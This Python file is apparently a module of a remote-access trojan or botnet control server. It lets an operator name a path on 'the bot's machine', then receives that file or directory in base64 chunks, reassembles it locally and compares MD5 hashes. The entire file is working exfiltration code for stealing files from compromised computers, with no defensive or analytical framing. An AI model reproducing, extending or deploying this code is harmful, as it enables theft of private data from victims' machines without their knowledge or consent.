# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
from os import path
from Cryptodome.Hash import MD5


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Download a file or directory from the bot.",
            "References": [],
            "Stoppable": False
        }

    def setup(self) -> Tuple[bool, Optional[dict]]:
        download_file = self._view.prompt("Path to file or directory on the bot's machine: ")
        buffer_size = self._view.prompt("Buffer size [ENTER for 4096 bytes]: ")
        output_name = self._view.prompt("Local output name [ENTER for <RANDOM>]: ")

        if not buffer_size:
            buffer_size = 4096
        if type(buffer_size) is not int:
            self._view.output("Invalid buffer size, using 4096.", "info")
            buffer_size = 4096
        if not output_name:
            output_name = random_string(8) + path.splitext(download_file)[1]

        if path.exists(path.join(OUTPUT_DIRECTORY, path.basename(download_file))):
            self._view.output("A file with that name already exists!", "attention")
            return False, None
        else:
            return True, {
                "buffer_size": buffer_size,
                "file_path": download_file,
                "response_options": {
                    "output_name": output_name
                }
            }

    def process_response(self, response: bytes, response_options: dict):
        # Files are sent back to us in small pieces (encoded with base64),
        # we simply decode these pieces and write them to the output file.
        output_name = response_options["output_name"]
        output_file = path.join(OUTPUT_DIRECTORY, output_name)

        try:
            str_response = response.decode()
        except UnicodeDecodeError:
            str_response = ""

        if "Failed to download" in str_response:
            self._view.output(str_response, "attention")
        elif "Compressing directory" in str_response:
            self._view.output(str_response, "info")
        elif "Stopped" in str_response:
            self._view.output(str_response, "info")
        elif "Started" in str_response:
            md5_hash = str_response.split("|")[1]

            self._view.output("Started downloading: \"{}\"...".format(output_name))
            self._view.output("Remote MD5 file hash: {}".format(md5_hash))
        elif "Finished" in str_response:
            self._view.output("Local MD5 file hash (MUST MATCH!): {}".format(self._get_file_hash(output_file)))
            self._view.output("Finished file download, saved to: {}".format(output_file))
        else:
            with open(output_file, "ab") as output_file:
                output_file.write(response)

    @staticmethod
    def _get_file_hash(file_path):
        result = MD5.new()

        with open(file_path, "rb") as input_file:
            while True:
                data = input_file.read(4096)

                if not data:
                    break
                result.update(data)
        return result.hexdigest()
